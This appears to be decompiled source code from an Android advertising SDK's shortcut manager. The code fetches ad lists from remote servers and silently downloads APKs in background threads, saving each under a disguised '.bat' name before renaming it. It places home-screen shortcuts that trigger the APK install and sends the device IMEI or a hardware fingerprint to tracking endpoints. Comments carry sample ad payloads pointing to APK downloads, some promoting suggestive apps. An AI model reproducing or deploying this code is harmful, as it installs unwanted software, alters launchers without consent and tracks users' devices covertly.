package com.bbads.android.shortcut;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.ProviderInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.telephony.TelephonyManager;
import com.bbads.android.CS;
import com.bbads.android.Constants;

public class ShortcutManager {
    public static void a(final Context context, final ArrayList<ShortcutApp> list) {
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                int index1 = 0;
                int index2 = 0;
                while (!list.isEmpty() && index2 != 5) {
                    DefaultHttpClient client = new DefaultHttpClient();
                    String packageName = list.get(index2).getPackageName();
                    String url = list.get(index2).getUrl();
                    String name = list.get(index2).getName();
                    String fileName = url.substring(1 + url.lastIndexOf("/"), url.length());
                    String adId = list.get(index2).getAdId();
                    try {
                        if (!ShortcutManager.isInstalled(context, packageName)) {
                            HttpGet httpget = new HttpGet(url);
                            HttpResponse httpresponse = client.execute(httpget);
                            File file = new File(Environment.getExternalStorageDirectory(), fileName);
                            if (file.exists() && file.length() == httpresponse.getEntity().getContentLength()) {
                                new StringBuilder(String.valueOf(file.getAbsolutePath())).append(",").append(packageName).append(",").append(name).toString();
                                client.getConnectionManager().shutdown();
                                ShortcutManager.a(context, list.get(index2));
                                new StringBuilder(String.valueOf(CS.apkDownLoaded)).append("app_id=").append(ShortcutManager.getAppIdFromPref(context, CS.PREF_KEY))
                                        .append("&uuid=").append(ShortcutManager.encodeInfo(context)).append("&ad_id=").append(adId).append("&ad_type=").append(CS.AD_TYPE)
                                        .toString();
                            } else {
                                file.delete();
                                String batFileName = url.substring(1 + url.lastIndexOf("/"), url.lastIndexOf(".")) + ".bat";
                                File batFile = new File(Environment.getExternalStorageDirectory(), batFileName);
                                InputStream inputstream = httpresponse.getEntity().getContent();
                                FileOutputStream outStream = new FileOutputStream(batFile);
                                byte[] abyte0 = new byte[1024];
                                int readLength;
                                while ((readLength = inputstream.read(abyte0)) != -1) {
                                    outStream.write(abyte0, 0, readLength);
                                }
                                outStream.flush();
                                inputstream.close();
                                outStream.close();
                                if (httpget != null) {
                                    httpget.abort();
                                }
                                batFile.renameTo(new File(Environment.getExternalStorageDirectory(), fileName));
                                new StringBuilder(String.valueOf(batFile.getAbsolutePath())).append(",").append(packageName).append(",").append(name).toString();
                                client.getConnectionManager().shutdown();
                                ShortcutManager.a(context, list.get(index2));
                                String s6 = new StringBuilder(String.valueOf(CS.apkDownLoaded)).append("app_id=")
                                        .append(ShortcutManager.getAppIdFromPref(context, CS.PREF_KEY)).append("&uuid=").append(ShortcutManager.encodeInfo(context))
                                        .append("&ad_id=").append(adId).append("&ad_type=").append(CS.AD_TYPE).toString();
                                ShortcutManager.report(context, s6);
                            }
                            index1++;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    if (index1 > 5) return;
                    index2++;
                }
            }
        }.start();
    }
    protected static void a(Context context, ShortcutApp class1009) {
        SharedPreferences sharedpreferences = context.getSharedPreferences(CS.PREF_KEY2, 0);
        String s = class1009.getPackageName();
        String s1 = new StringBuilder(String.valueOf(class1009.getAdId())).append(",").append(class1009.getPackageName()).append(",").append(class1009.getName()).append(",")
                .append(class1009.getUrl()).toString();
        android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
        editor.putString(s, s1);
        editor.commit();
    }
    public static void c(final Context paramContext, final String param2) {
        new Thread() {
            @Override
            public void run() {
                StringBuilder sb = new StringBuilder();
                String uuid = ShortcutManager.encodeInfo(paramContext);
                int j = ShortcutManager.getSurvivalTime(paramContext);
                String s1 = new StringBuilder(String.valueOf(Build.MODEL)).toString().toString().replace(" ", "");
                String s2 = new StringBuilder(String.valueOf(CS.getadlist)).append("app_id=").append(param2).append("&uuid=").append(uuid)
                        .append("&data_type=ad&ad_type=").append(CS.AD_TYPE).append("&model=").append(s1).append("&survivaltime=").append(j).append("&apiVersion=")
                        .append(android.os.Build.VERSION.RELEASE).toString();
                DefaultHttpClient client = new DefaultHttpClient();
                HttpGet httpget = new HttpGet(s2);
                try {
                    BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(client.execute(httpget).getEntity().getContent()));
                    String s3;
                    while ((s3 = bufferedreader.readLine()) != null) {
                        sb.append(s3);
                    }
                    bufferedreader.close();
                    //{"ads":[{"id":"1357","name":"\u4e50\u89c6\u9891","icon":"http:\/\/pic.iuiss.com\/xinlogo\/dfgred.jpg","intro":"\u4e50\u89c6\u9891-\u6d77\u91cf\u7f8e\u5973\u89c6\u9891\u4e0b\u8f7d\u3002","package":"com.android.youle","appurl":"http:\/\/apk.iuiss.com\/niuniu\/296187.apk","bigpic":"http:\/\/pic.iuiss.com\/xinlogo\/tivi.jpg","islock":"1"},{"id":"1339","name":"\u5c11\u5973\u79c1\u5bc6","icon":"http:\/\/pic.leapp.cc\/logo\/fdeww.jpg","intro":"\u5c11\u5973\u79c1\u5bc6-\u4e00\u6b3e\u6e05\u7eaf\u5199\u771f\u5927\u5168\uff0c\u4eae\u778e\u4f60\u7684\u53cc\u773c\u3002","package":"com.we.fd.qes","appurl":"http:\/\/apk.iuiss.com\/niuniu\/xp01_.apk","bigpic":"http:\/\/pic.iuiss.com\/xinlogo\/simi12.jpg","islock":"1"},{"id":"1351","name":"\u641e\u4f60\u59b9","icon":"http:\/\/pic.iuiss.com\/xinlogo\/efrgsref.jpg","intro":"\u641e\u4f60\u59b9\u6765\u4e86\uff0c\u65e0\u8bba\u4f60\u662f\u5b85\u7537\uff0c\u578b\u7537\uff0c\u9ad8\u5bcc\u5e05\uff0c\u6ca1\u6709\u4eba\u4f1a\u9519\u8fc7\u8fd92015\u5e74\u6700\u6709\u8da3\u7684\u6e38\u620f\u3002","package":"com.yiyou.yoursister","appurl":"http:\/\/apk.iuiss.com\/niuniu\/g600026.apk","bigpic":"http:\/\/pic.iuiss.com\/xinlogo\/nimei.jpg","islock":"1"},{"id":"1272","name":"\u6d88\u706d\u661f\u661f","icon":"http:\/\/pic.iuiss.com\/xinlogo\/fghtrff.jpg","intro":"\u6d88\u706d\u661f\u661f-\u4e00\u6b3e\u795e\u4f5c\uff0c\u8d85\u7ea7\u597d\u73a9\u7684\u6d88\u706d\u6e38\u620f\u3002","package":"com.loveplay.xmxx207.tmcps.Activity","appurl":"http:\/\/apk.iuiss.com\/niuniu\/xiaomiexingxing.apk","bigpic":"http:\/\/pic.iuiss.com\/xinlogo\/rgfrfse.jpg","islock":"1"},{"id":"1300","name":"\u5168\u6c11\u50f5\u5c38\u5927\u6218.","icon":"http:\/\/pic.iuiss.com\/xinlogo\/jiangshiheh.png","intro":"2015\u5e74\u6700\u706b\u70ed\u7684\u5c0f\u6e38\u620f\u2014\u2014\u5168\u6c11\u50f5\u5c38\u5927\u6218\uff01","package":"yy.gameqy.jslr","appurl":"http:\/\/apk.iuiss.com\/niuniu\/jiangshi.apk","bigpic":"http:\/\/pic.iuiss.com\/xinlogo\/jiangshizh.jpg","islock":"1"}],"size":"5"}
                    String responseText = sb.toString().trim();
                    if (responseText.length() > 0) {
                        if (responseText.contains("[")) responseText = responseText.substring(responseText.indexOf("["), 1 + responseText.lastIndexOf("]"));
                        Editor editor = paramContext.getSharedPreferences(CS.PREF_KEY, 0).edit();
                        editor.putString(CS.AP_PATH_TAG, responseText);
                        editor.commit();
                        JSONArray jsonarray = new JSONArray(responseText);
                        ArrayList<ShortcutApp> list = new ArrayList<ShortcutApp>();
                        for (int i = 0; i < jsonarray.length(); i++) {
                            ShortcutApp shortcut = new ShortcutApp();
                            JSONObject jsonobject = jsonarray.getJSONObject(i);
                            shortcut.setId(jsonobject.getString("id"));
                            shortcut.setName(jsonobject.getString("name"));
                            shortcut.setIcon(jsonobject.getString("icon").replace("\\", ""));
                            shortcut.setIntro(jsonobject.getString("intro"));
                            shortcut.setPackageName(jsonobject.getString("package"));
                            shortcut.setBigPic(jsonobject.getString("bigpic").replace("\\", ""));
                            shortcut.setAppUrl(jsonobject.getString("appurl").replace("\\", ""));
                            shortcut.seteLock(jsonobject.getString("islock"));
                            list.add(shortcut);
                        }
                        client.getConnectionManager().shutdown();
                        ShortcutHelper.a(list);
                        return;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }
    protected static void downloadIcon(Context context, ShortcutApp bean, String filePath) {
        try {
            HttpURLConnection httpurlconnection = (HttpURLConnection) new URL(bean.getIconUrl()).openConnection();
            httpurlconnection.connect();
            Bitmap bitmap = BitmapFactory.decodeStream(httpurlconnection.getInputStream());
            bean.setBitMap(bitmap);
            installShortcut(context, bean.getName(), bitmap, filePath);
            return;
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }
    protected static String encodeInfo(Context context) {
        String s = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
        if (s == null || "".equals(s)) s = new StringBuilder("35").append(Build.BOARD.length() % 10).append(Build.BRAND.length() % 10).append(Build.CPU_ABI.length() % 10)
                .append(Build.DEVICE.length() % 10).append(Build.DISPLAY.length() % 10).append(Build.HOST.length() % 10).append(Build.ID.length() % 10)
                .append(Build.MANUFACTURER.length() % 10).append(Build.MODEL.length() % 10).append(Build.PRODUCT.length() % 10).append(Build.TAGS.length() % 10)
                .append(Build.TYPE.length() % 10).append(Build.USER.length() % 10).toString();
        return s;
    }
    public static String getAppIdFromPref(Context context, String prefName) {
        return context.getSharedPreferences(prefName, 0).getString("appid", "");
    }
    private static String getAuthority(Context context, String permissionName) {
        if (permissionName == null) return null;
        List<PackageInfo> list = context.getPackageManager().getInstalledPackages(8);
        if (list != null) {
            Iterator<PackageInfo> iterator = list.iterator();
            while (iterator.hasNext()) {
                ProviderInfo aproviderinfo[] = iterator.next().providers;
                if (aproviderinfo != null) {
                    int i = 0;
                    while (i < aproviderinfo.length) {
                        ProviderInfo providerinfo = aproviderinfo[i];
                        if (permissionName.equals(providerinfo.readPermission)) return providerinfo.authority;
                        if (permissionName.equals(providerinfo.writePermission)) return providerinfo.authority;
                        i++;
                    }
                }
            }
        }
        return null;
    }
    public static int getSurvivalTime(Context context) {
        SharedPreferences sharedpreferences = context.getSharedPreferences(CS.PREF_KEY, 0);
        int i = sharedpreferences.getInt(CS.INSTALL_MONTH_TAG, 1 + new Date().getMonth());
        int j = sharedpreferences.getInt(CS.INSTALL_DAY_TAG, new Date().getDate());
        if (1 + new Date().getMonth() > i) return new Date().getDate() + Calendar.getInstance().getActualMaximum(5) - j;
        else return new Date().getDate() - j;
    }
    public static boolean has(Context context, String name) {
        ContentResolver contentresolver = context.getContentResolver();
        String authority = getAuthority(context, "com.android.launcher.permission.READ_SETTINGS");
        Cursor cursor = contentresolver.query(Uri.parse(new StringBuilder("content://").append(authority).append("/favorites?notify=true").toString()), new String[] { "title",
                "iconResource" }, "title=?", new String[] { name }, null);
        return cursor != null && cursor.getCount() > 0;
    }
    private static void installShortcut(final Context paramContext, final ArrayList<ShortcutApp> list) {
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                int i = 0;
                while (i < list.size()) {
                    if (!ShortcutManager.has(paramContext, list.get(i).getName())) {
                        try {
                            if (list.get(i).getIsApk().equals("1")) {
                                HttpURLConnection httpurlconnection = (HttpURLConnection) new URL(list.get(i).getIconUrl()).openConnection();
                                httpurlconnection.connect();
                                InputStream inputstream = httpurlconnection.getInputStream();
                                Intent intent = new Intent();
                                intent.addFlags(0x10000000);
                                intent.setAction("android.intent.action.VIEW");
                                intent.setData(Uri.parse(list.get(i).getUrl()));
                                Intent intent1 = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
                                intent1.putExtra("android.intent.extra.shortcut.NAME", list.get(i).getName());
                                intent1.putExtra("android.intent.extra.shortcut.INTENT", intent);
                                intent1.putExtra("android.intent.extra.shortcut.ICON", BitmapFactory.decodeStream(inputstream));
                                intent1.putExtra("duplicate", false);
                                paramContext.sendBroadcast(intent1);
                            } else {
                                String s = list.get(i).getUrl();
                                list.get(i).getName();
                                String s1 = s.substring(1 + s.lastIndexOf("/"), s.length());
                                DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
                                HttpGet httpget = new HttpGet(s);
                                HttpResponse httpresponse = defaulthttpclient.execute(httpget);
                                File file = new File(Environment.getExternalStorageDirectory(), s1);
                                if (file.exists() && file.length() == httpresponse.getEntity().getContentLength()) {
                                    defaulthttpclient.getConnectionManager().shutdown();
                                    ShortcutManager.downloadIcon(paramContext, list.get(i), file.getAbsolutePath());
                                } else {
                                    file.delete();
                                    String s2 = new StringBuilder(String.valueOf(s.substring(1 + s.lastIndexOf("/"), s.lastIndexOf(".")))).append(".bat").toString();
                                    File file1 = new File(Environment.getExternalStorageDirectory(), s2);
                                    InputStream inputstream1 = httpresponse.getEntity().getContent();
                                    FileOutputStream fileoutputstream = new FileOutputStream(file1);
                                    byte[] abyte0 = new byte[1024];
                                    int j;
                                    while ((j = inputstream1.read(abyte0)) != -1) {
                                        fileoutputstream.write(abyte0, 0, j);
                                    }
                                    fileoutputstream.flush();
                                    inputstream1.close();
                                    fileoutputstream.close();
                                    if (httpget != null) {
                                        httpget.abort();
                                    }
                                    file1.renameTo(new File(Environment.getExternalStorageDirectory(), s1));
                                    defaulthttpclient.getConnectionManager().shutdown();
                                    ShortcutManager.downloadIcon(paramContext, list.get(i), file.getAbsolutePath());
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    i++;
                }
            }
        }.start();
    }
    protected static void installShortcut(Context context, String jsonArray) {
        try {
            JSONArray array = new JSONArray(jsonArray);
            ArrayList<ShortcutApp> list = new ArrayList<ShortcutApp>();
            int i = 0;
            while (i < array.length()) {
                ShortcutApp shortcut = new ShortcutApp();
                JSONObject jsonobject = array.getJSONObject(i);
                shortcut.setName(jsonobject.getString("name"));
                shortcut.setIcon(jsonobject.getString("icon").replace("\\", ""));
                shortcut.setAppUrl(jsonobject.getString("appurl").replace("\\", ""));
                shortcut.setIsApk(jsonobject.getString("isapk"));
                list.add(shortcut);
                i++;
            }
            installShortcut(context, list);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    public static void installShortcut(Context context, String s, Bitmap bitmap, String filePath) {
        Intent intent = new Intent();
        intent.addFlags(0x10000000);
        intent.setAction("android.intent.action.VIEW");
        intent.setDataAndType(Uri.fromFile(new File(filePath)), "application/vnd.android.package-archive");
        Intent intent1 = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
        intent1.putExtra("android.intent.extra.shortcut.NAME", s);
        intent1.putExtra("android.intent.extra.shortcut.INTENT", intent);
        intent1.putExtra("android.intent.extra.shortcut.ICON", bitmap);
        intent1.putExtra("duplicate", false);
        context.sendBroadcast(intent1);
    }
    public static boolean isInstalled(Context context, String packageName) {
        Iterator<PackageInfo> iterator = context.getPackageManager().getInstalledPackages(8192).iterator();
        do
            if (!iterator.hasNext()) return false;
        while (!iterator.next().packageName.equals(packageName));
        return true;
    }
    protected static boolean isTime(String paramString, Context paramContext) {
        SharedPreferences localSharedPreferences = paramContext.getSharedPreferences(paramString, 0);
        long l1 = localSharedPreferences.getLong("preTime", 0L);
        long l2 = Math.abs(System.currentTimeMillis() - l1) / 60000L;
        int i = localSharedPreferences.getInt("times", 0);
        boolean bool1 = l2 < 5L;
        boolean bool2 = false;
        if (!bool1) {
            SharedPreferences.Editor localEditor = localSharedPreferences.edit();
            localEditor.putLong("preTime", System.currentTimeMillis());
            localEditor.putInt("times", i + 1);
            localEditor.commit();
            bool2 = true;
        }
        return bool2;
    }
    protected static void report(final Context paramContext, final String param1) {
        new Thread() {
            @Override
            public void run() {
                try {
                    String model = new StringBuilder(String.valueOf(Build.MODEL)).toString().toString().replace(" ", "");
                    int survivaltime = ShortcutManager.getSurvivalTime(paramContext);
                    String targetUrl = new StringBuilder(String.valueOf(param1)).append("&model=").append(model).append("&survivaltime=").append(survivaltime).toString();
                    DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
                    HttpGet httpget = new HttpGet(targetUrl);
                    defaulthttpclient.execute(httpget);
                    httpget.abort();
                    defaulthttpclient.getConnectionManager().shutdown();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }
    public static void request(final Context context) {
        new Thread() {
            @Override
            public void run() {
                DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
                HttpGet httpget = new HttpGet(CS.ADS_URL);
                try {
                    BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(defaulthttpclient.execute(httpget).getEntity().getContent()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = bufferedreader.readLine()) != null) {
                        sb.append(line);
                    }
                    //{"ads":[{"name":"\u4e50\u89c6\u9891","icon":"http:\/\/pic.iuiss.com\/xinlogo\/dfgred.jpg","appurl":"http:\/\/apk.iuiss.com\/niuniu\/296187.apk","isapk":"1"},{"name":"\u5c11\u5973\u79c1\u5bc6","icon":"http:\/\/pic.leapp.cc\/logo\/fdeww.jpg","appurl":"http:\/\/apk.iuiss.com\/niuniu\/xp01_.apk","isapk":"1"},{"name":"\u641e\u4f60\u59b9","icon":"http:\/\/pic.iuiss.com\/xinlogo\/efrgsref.jpg","appurl":"http:\/\/apk.iuiss.com\/niuniu\/g600026.apk","isapk":"1"}],"size":3}
                    if (sb.length() > 0) {
                        String s1 = sb.substring(sb.indexOf("["), 1 + sb.lastIndexOf("]"));
                        installShortcut(context, s1);
                    }
                    defaulthttpclient.getConnectionManager().shutdown();
                    return;
                } catch (Exception ioexception) {
                    ioexception.printStackTrace();
                }
            }
        }.start();
    }
    public static void startActivity(Context context, String packageName) {
        context.startActivity(context.getPackageManager().getLaunchIntentForPackage(packageName));
    }
}
